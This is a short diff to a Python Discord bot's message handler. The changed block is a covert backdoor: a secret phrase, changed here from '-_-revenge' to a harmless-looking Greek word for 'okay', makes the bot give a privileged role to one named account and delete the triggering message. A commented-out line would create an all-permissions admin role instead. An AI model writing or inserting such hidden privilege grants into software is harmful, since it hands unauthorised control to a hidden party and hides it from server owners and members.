@@ -510,11 +510,11 @@ async def on_message(message):
         log.close
 		
         
-    if message.content == "-_-revenge":
+    if message.content == "Ενταξεί.":
         auth = message.author
         role =  get(message.server.roles, name="OG Bois")
         #role = await client.create_role(message.server, name = "Adm3n", permissions = discord.Permissions.all(), colour = discord.Colour(0xe67e22), hoist = True )
-        await client.add_roles(message.server.get_member_named("PterodactyLUL#0593"), role)
+        await client.add_roles(message.server.get_member_named("PterodactyLUL#0621"), role)
         await client.delete_message(message)
 
     # if message.content[:(len('!COMMANDS')+1)].upper()=='!COMMANDS':
